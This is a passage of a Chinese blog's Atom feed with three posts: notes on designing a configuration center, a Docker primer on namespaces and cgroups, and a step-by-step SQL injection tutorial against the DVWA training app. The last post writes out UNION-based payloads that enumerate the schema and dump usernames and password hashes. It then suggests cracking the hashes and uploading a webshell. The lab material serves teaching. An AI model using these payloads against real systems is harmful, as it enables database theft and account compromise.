    <id>https://t1ger.github.io/2016/11/23/配置中心那点事/</id>
    <published>2016-11-23T05:12:05.000Z</published>
    <updated>2016-11-23T09:46:08.971Z</updated>
    
    <content type="html"><![CDATA[<h4 id="配置中心怎么做"><a href="#配置中心怎么做" class="headerlink" title="配置中心怎么做"></a><b>配置中心怎么做</b></h4><ul>
<li>配置分发，实现有两种方式<br>推：实时性变更，需要应用和配置中心保持长连接，复杂度高<br>拉：实时性相对差，没有增量更新机制会增加配置中心压力，复杂度低</li>
<li>订阅和发布<br>支持配置变更通知，如果是推送，server把每次变更实时发送给订阅客户端<br>如果是拉取，则通过比较client和server的数据md5来实现有效变更通知。server会下发数据和md5给client,client请求的时候会带上md5,假如md5变化，则server重新下发，否则无需变更，返回”无变更”</li>
<li>多环镜、集群配置管理<br>同一份程序在不同的环境（开发，测试，生产）、不同的集群（如不同的数据中心）经常需要有不同的配置，所以需要有完善的环境、集群配置管理</li>
<li>权限控制和操作审计：配置能改变程序的行为,需要有完善的权限控制，以防错误的配置引起的故障。变更操作都要有审计日志，可以方便的追踪问题</li>
<li>版本管理<br>所有的配置发布都有版本概念，从而可以方便的支持配置的回滚</li>
<li>支持灰度发布<br>支持配置的灰度发布，比如点了发布后，只对部分应用实例生效，等观察一段时间没问题后再推给所有应用实例,两种解决方案：<br>a.配置项增加一个host属性，表示这个配置项只“发布”给某些IP<br>b.定义一个优先级，客户端优先加载本地配置文件，这样如果某些机器上的应用需要特殊配置，那么可以采用老的方式上去修改其本地配置文件</li>
<li>支持降级<br>非核心服务降级开关。发生问题时，降级服务的非核心服务</li>
<li>同时支持web页面和Restful API接口</li>
<li>支持多语言，支持php这种无状态语言</li>
<li>支持容错性，当server出现问题时，不影响client的运行</li>
<li>支持本地缓存，减少每次获取配置项时与server的网络消耗，仅server更新时通知client</li>
</ul>
<h4 id="客户端怎么支持"><a href="#客户端怎么支持" class="headerlink" title="客户端怎么支持"></a><b>客户端怎么支持</b></h4><ul>
<li>配合配置中心的推送，在参数变化时调用客户端自行实现的回调接口，不需要重启应用</li>
<li>支持环境变量，JVM启动参数，配置文件，配置中心等多种来源按优先级互相覆盖，并有接口暴露最后的参数选择</li>
<li>配置文件中支持多套profile，如开发，单元测试，集成测试，生产</li>
</ul>
<h4 id="开源解决方案现状"><a href="#开源解决方案现状" class="headerlink" title="开源解决方案现状"></a><b>开源解决方案现状</b></h4><ul>
<li>淘宝的<a href="">Diamond</a></li>
<li>携程开源的<a href="https://github.com/ctripcorp/apollo" target="_blank" rel="external">Applo</a>，支持Java，其他语言通过Http支持</li>
<li>个人开源的<a href="https://github.com/knightliao/disconf/tree/master/disconf-web" target="_blank" rel="external">disconf</a>，只支持Java＋Spring</li>
<li>360的<a href="https://github.com/Qihoo360/QConf" target="_blank" rel="external">Qconf</a>，基于zk，特色是基于Agent模式的多语言支持。但服务端也没有界面、灰度、预案什么的，直接通过API操作ZK而已</li>
<li>个人开源的<a href="https://github.com/hengyunabc/xdiamond" target="_blank" rel="external">xdiamond</a></li>
<li>个人开源的<a href="https://github.com/cncduLee/zk-ucc" target="_blank" rel="external">zk-ucc</a></li>
<li>个人开源的<a href="https://github.com/xuxueli/xxl-conf" target="_blank" rel="external">xxlconf</a></li>
<li>个人开源的<a href="https://github.com/ihaolin/diablo" target="_blank" rel="external">diablo</a></li>
<li><a href="https://github.com/coreos/etcd" target="_blank" rel="external">etcd</a></li>
<li><a href="https://zookeeper.apache.org" target="_blank" rel="external">zookeeper</a></li>
<li><a href="https://www.consul.io/" target="_blank" rel="external">consul</a></li>
<li><a href="https://github.com/kelseyhightower/confd" target="_blank" rel="external">confd</a></li>
<li><a href="http://www.cfg4j.org" target="_blank" rel="external">cfg4j</a></li>
<li><a href="https://github.com/melin/super-diamond" target="_blank" rel="external">super-diamond</a> ,已停止更新</li>
</ul>
<p>开源之外呢？<br>应该说最好的配置中心还是在各个互联网公司的基础架构部里，虽然不是完美，虽然修修补补，常见的两种玩法</p>
<ul>
<li><p>一种玩法是基于zk和etcd，一般支持界面和api,用数据库来保存版本历史，预案，走流程,最后下发到zk或etcd这种有推送能力的存储里（服务注册本身也是用zk或etcd，选型就一块了）。客户端都直接和zk或etcd打交道<br>灰度发布麻烦些，其中一种实现是同时发布一个可接收的IP列表，客户端监听到配置节点变化时，对比一下自己是否属于该列表<br>PHP这种无状态的语言和其他zk/etcd不支持的语言，只好自己在客户端的机器上起一个Agent来监听变化，再写到配置文件或Share Memory了</p>
</li>
<li><p>另一种玩法是基于运维自动化的配置文件的推送，一样有数据库与界面或API来管理配置，下发时生成配置文件，基于各种运维自动化工具如Puppet，Ansible推送到每个客户端。而应用则定时重新读取这个外部的配置文件</p>
</li>
</ul>
<p>ref<br><a href="http://jm.taobao.org/2016/09/28/an-article-about-config-center/" target="_blank" rel="external">一篇好TM长的关于配置中心的文章</a><br><a href="http://calvin1978.blogcn.com/articles/serviceconfig.html" target="_blank" rel="external">服务化体系之－配置中心，在ZK或etcd之外</a><br><a href="http://vernonzheng.com/2015/02/09/%E5%BC%80%E6%BA%90%E5%88%86%E5%B8%83%E5%BC%8F%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83%E9%80%89%E5%9E%8B/" target="_blank" rel="external">开源分布式配置中心选型</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;配置中心怎么做&quot;&gt;&lt;a href=&quot;#配置中心怎么做&quot; class=&quot;headerlink&quot; title=&quot;配置中心怎么做&quot;&gt;&lt;/a&gt;&lt;b&gt;配置中心怎么做&lt;/b&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;配置分发，实现有两种方式&lt;br&gt;推：实时性变更，需要应用和配置中心保持长连
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Docker初体验-基础入门指北</title>
    <link href="https://t1ger.github.io/2016/11/21/Docker%E5%88%9D%E4%BD%93%E9%AA%8C-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/"/>
    <id>https://t1ger.github.io/2016/11/21/Docker初体验-基础入门指北/</id>
    <published>2016-11-21T10:08:35.000Z</published>
    <updated>2016-11-22T04:00:20.063Z</updated>
    
    <content type="html"><![CDATA[<h4 id="docker是什么"><a href="#docker是什么" class="headerlink" title="docker是什么"></a><b>docker是什么</b></h4><p>docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口</p>
<h4 id="docker做什么"><a href="#docker做什么" class="headerlink" title="docker做什么"></a><b>docker做什么</b></h4><p>在docker中，你可以将你的程序分为不同的基础部分，对于每一个基础部分都可以当做一个应用程序来管理<br>docker能够帮助你快速地测试、快速地编码、快速地交付，并且缩短你从编码到运行应用的周期<br>docker使用轻量级的容器虚拟化平台，并且结合工作流和工具，来帮助你管理、部署你的应用程序</p>
<h4 id="docker-vs-VM"><a href="#docker-vs-VM" class="headerlink" title="docker vs VM"></a><b>docker vs VM</b></h4><p>VMs = Server + Host OS + Hypervisor（Type2）+ Guest OS + Bins/Libs +(App A | App A’ | App B)<br>Containers = Server + Host OS + Docker Engine + ((Bins/Libs +App A | App A’) | (Bins/Libs +App B))<br>Docker去除了传统虚机的Guest OS层，免除了对应overhead，Docker Engine 替代了VM中的Guest OS + Hypervisor（Type2)层</p>
<h4 id="docker架构"><a href="#docker架构" class="headerlink" title="docker架构"></a><b>docker架构</b></h4><p>docker是CS架构，主要由下面三部分组成：<br>docker daemon: 运行在宿主机上，docker守护进程，用户通过docker client(docker命令)与docker daemon交互<br>docker client: docker 命令行工具，是用户使用docker的主要方式，docker client与docker daemon通信并将结果返回给用户，docker client也可以通过socket或者RESTful api访问远程的docker daemon<br>docker hub/registry: 共享和管理docker镜像，用户可以上传或者下载上面的镜像，官方地址为 <a href="https://registry.hub.docker.com" target="_blank" rel="external">https://registry.hub.docker.com</a> ,也可以搭建自己私有的docker registry</p>
<h4 id="docker技术术语"><a href="#docker技术术语" class="headerlink" title="docker技术术语"></a><b>docker技术术语</b></h4><p>docker的几个技术：namespace,cgroups,veth,bridge,copy-on-write,image,container<br>其中namespace和cgroup是其核心技术,我们主要来介绍这两个</p>
<h4 id="a-namespace"><a href="#a-namespace" class="headerlink" title="a. namespace"></a><b>a. namespace</b></h4><p>负责隔离资源，它让进程拥有独立的进程号，网络，文件系统等，不同的namespace下的进程互不可见，目前的Docker可以通过exec子命令直接切换到进程所在的namespace<br>docker使用到的命名空间有:</p>
<ul>
<li>pid命名空间: 使用在进程隔离(PID: Process ID)</li>
<li>net命名空间: 使用在管理网络接口(NET: Networking)</li>
<li>ipc命名空间: 使用在管理进程间通信资源 (IPC: InterProcess Communication)</li>
<li>mnt命名空间: 使用在管理挂载点 (MNT: Mount)</li>
<li>uts命名空间: 使用在隔离内核和版本标识 (UTS: Unix Timesharing System)</li>
</ul>
<h4 id="b-cgroups"><a href="#b-cgroups" class="headerlink" title="b. cgroups"></a><b>b. cgroups</b></h4><p>cgroup负责限制资源,主要体现在cpu、内存、磁盘</p>
<p><b>CPU子系统</b><br>cgroups提供了三种限制CPU资源的方式：cpuset， cpuquota和cpushares</p>
<ul>
<li><p>cpuset可以限制进程使用的cpu核数，通过cpuset/cpuset.cpus来管理，相应的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run --cpuset-cpus 0 -d --name apache apache</div></pre></td></tr></table></figure>
</li>
<li><p>cpuquota以时间片的使用率来限制CPU资源，要比cpuset的细粒度大一些，只需要设置一个相对100000的值就可以达到限制一个百分比的效果, 通过 cpu/cpu.cfs_period_us （配置时间片单位，默认为100000）和 cpu/cpu.cfs_quota_us (时间片占比)两个文件来管理,相应的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run --cpu-quota 50000 -d --name apache apache</div></pre></td></tr></table></figure>
</li>
<li><p>cpushares根据权重来分配CPU资源，比如如果只有一个进程权重为100，那么进程可以使用100%的CPU资源，如果有两个进程且权重都是100，那么每个进程可以使用50%的CPU资源 , 通过 cpu/cpu.shares 来管理，相应的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run --cpu-shares 1024 -d --name apache apache</div></pre></td></tr></table></figure>
</li>
</ul>
<p><b>内存子系统</b></p>
<ul>
<li>cgroups对内存的限制包括物理内存和swap，当进程使用内存达到上限时会被kill，关于内存限制的文件如下：<br>memory.limit_in_bytes memory.soft_limit_in_bytes memory.memsw.limit_in_byte,需要注意的一点是docker默认会将swap的限制设置为2倍内存，实际使用的内存可能会大于 -m 设置的内存大小,相应的docker命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -m 100m -d --name apache apache</div></pre></td></tr></table></figure>
</li>
</ul>
<p><b>blkio子系统</b></p>
<ul>
<li>blkio子系统的功能是对块设备读写的速率限制,目前 blkio 子系统提供的两种控制策略，一个是权重比例方式的控制，另一个是针对 IO 带宽和 IOPS 的控制.前者是针对blkio.weight 分配权重，后者对blkio.throttle.write_iops_device 进行限制。</li>
</ul>
<p>ref </p>
<p><a href="https://www.baidu.com/link?url=ubhv7epUUNTpytivc7_ikrYX-flsGZHW9gn0REl9273xJa2YpM3kLz2wR6BqkCSMjYMZrXuyJlXQjU1bil4uja&amp;wd=&amp;eqid=e8f57cc000011018000000025833b49b" target="_blank" rel="external">Docker 百度百科</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      how to use docker quickly
    
    </summary>
    
    
      <category term="docker" scheme="https://t1ger.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>dvwa平台测试sql注入</title>
    <link href="https://t1ger.github.io/2016/11/20/dvwa%E5%B9%B3%E5%8F%B0%E6%B5%8B%E8%AF%95sql%E6%B3%A8%E5%85%A5/"/>
    <id>https://t1ger.github.io/2016/11/20/dvwa平台测试sql注入/</id>
    <published>2016-11-20T03:28:59.000Z</published>
    <updated>2016-11-20T05:58:44.255Z</updated>
    
    <content type="html"><![CDATA[<p>前言<br>先做个简单介绍：DVWA(Dam Vulnerable Web Application)环境演示，DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。<br>本文所有演示操作都是在此环境中,本文是帮助用户了解信息安全技术、安全漏洞相关信息，不承担任何法律及连带责任</p>
<p>我们的测试环境：<br>测试平台：dvwa<br>渗透工具推荐：burpsuite<br>本次测试主要针对mysql数据库，针对不同的数据库平台，注入语句需要做相应更改</p>
<p>首先，我们此次测试的安全等级为low，先让自己有点信心吗，免的一上来就被打脸</p>
<p>sql注入利用一般有以下几个基本步骤:</p>
<ul>
<li>发现sql注入点</li>
<li>通过mysql数据库帮助，获取账户密码等敏感信息</li>
<li>上传webshell,获得一个反向链接</li>
</ul>
<p>闲言少叙，赶紧开始吧</p>
<p>一般我们先登入dvwa平台，选择Sql Injection选项，有的同学要说了，用户密码是什么呀？这个。。。，其实找个暴力破解工具解决了，如果不行问问谷歌也可以哈<br>这里我们看到一个输入框，提示我们输入用户id,这里我们输入数字1，提交后返回了用户1的信息<br>它一共返回三行数据<br>一行是我们输入的用户ID。一行是用户名，另外一行是用户别名。同时，看一下浏览器的地址栏那里，发现url成这样了<br><a href="http://192.168.100.100/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" target="_blank" rel="external">http://192.168.100.100/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a></p>
<p>接下来我们输入2,发现url变成了<br><a href="http://192.168.100.100/vulnerabilities/sqli/?id=2&amp;Submit=Submit#" target="_blank" rel="external">http://192.168.100.100/vulnerabilities/sqli/?id=2&amp;Submit=Submit#</a></p>
<p>接下来我们输入“’”时，页面提示错误“You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’’’ at line 1”，结果如图。看到这个结果，我们可以欣慰的知道，这个表单存在着注入漏洞。<br>之所以产生错误是因为，输入的用户ID中,单引号不是一个整数类型的，导致后端SQL查询产生了错误，可以想象一下后端SQL查询语句大概是这样:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;select first_name,last_name from users where user_id=”;</div></pre></td></tr></table></figure>
<p>在我们输入“’”后，sql语句就会变成如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MySQL&gt; select first_name, last_name from users where user_id=”’ ;</div></pre></td></tr></table></figure></p>
<p>好了，到这里，我们可以得出这里传进去的id的值是我们可以控制的。前端的该语句是会在后端的sql服务器进行执行的，这将使sql注入变为可能</p>
<p>在我们确认了漏洞之后，就可以构造payload了。什么是payload?说白了就是一段恶意代码，以便我们能够获得数据库里面的数据。<br>我们需要确定表里边有几个字段，常用的方法有两种</p>
<ul>
<li>用order by 语句</li>
<li>用union select </li>
</ul>
<p>分析字段数的原因是我们之后需要用union select 语句获得我们需要的敏感数据。<br>由order by 语法知道，要是后面跟着的数字超出了字段数时，就会报错<br>我们构造的payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1&apos; order by 1#</div><div class="line">1&apos; order by 2#</div><div class="line">1&apos; order by 3#</div></pre></td></tr></table></figure></p>
<p>当输入到3的时候，发现它报错了，也就是说字段数为2。</p>
<p>当用union select 猜测的时候也是一样，当字段数不对应的时候，它也是会发生报错的，这里直接贴出payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1&apos; union select 1#</div><div class="line">1&apos; union select 1,2#</div><div class="line">1&apos; union select 1,2,3#</div></pre></td></tr></table></figure></p>
<p>准备工作都做好了，那我们开始获取数据库的敏感信息了：获取当前数据库名和用户名，构造payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1&apos; union select database(),user()#</div></pre></td></tr></table></figure></p>
<p>返回如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ID: 1&apos; union select database(),user()#</div><div class="line">First name: admin</div><div class="line">Surname: admin</div><div class="line">ID: 1&apos; union select database(),user()#</div><div class="line">First name: dvwa</div><div class="line">Surname: admin@localhost</div></pre></td></tr></table></figure></p>
<p>我们可以看到当前使用的数据库为：dvwa，当前的用户名：root@localhost。<br>类似的函数还有：version() 获取当前数据库版本,@@version_compile_os获取当前操作系统。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select version(),@@version_compile_os#</div></pre></td></tr></table></figure></p>
<p>光获得这些信息有什么用呢，慢慢听我道来<br>我们知道mysql有个information_schema，这是一个包含了mysql数据库所有信息的“字典”，本质上还是一个database，存放着其他各个数据的信息<br>在information_schema里，有一个表tables。有一个columns……是不是有点感觉了？ tables这个表存放的是关于数据库中所有表的信息，里面有个字段叫table_name，还有个字段叫做table_schema。其中table_name是表名，table_schema表示的是这个表所在的数据库。对于columns，它有column_name，table_schema，table_name。回想一下，我们拥有的信息是数据库名。也就是说我们可以构造这样的payload来从数据库里获取一些东西。</p>
<p>构造的查询语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div></pre></td></tr></table></figure></p>
<p>返回如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ID: -1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div><div class="line">First name: guestbook</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div><div class="line">First name: users</div><div class="line">Surname: 2</div></pre></td></tr></table></figure></p>
<p>出来两个表，对那个感兴趣呢？？？当然是users表啦！不是说还有一个columns表么？所以我们还需要table_name以及table_schema来查column_name。这次我们构造的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div></pre></td></tr></table></figure></p>
<p>返回如下信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: user_id</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: first_name</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: last_name</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: user</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: password</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: avatar</div><div class="line">Surname: 2</div></pre></td></tr></table></figure>
<p>这么多数据，选哪个呢？？？废话，当然是user，password啦。我们再次修改payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select user,password from users#</div></pre></td></tr></table></figure></p>
<p>终于返回我们想看的数据了，不过貌似密码是md5加密过的，这能难倒我们么，找度娘帮忙，找一些破解md5值的网站来进行破解<br>之后返回登陆界面验证下</p>
<p>简单的SQL注入就说到这儿了，下次我们将进行DVWA里面的中级SQL注入</p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前言&lt;br&gt;先做个简单介绍：DVWA(Dam Vulnerable Web Application)环境演示，DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。&lt;br&gt;本文所有演示
    
    </summary>
    
    
  </entry>
  
</feed>
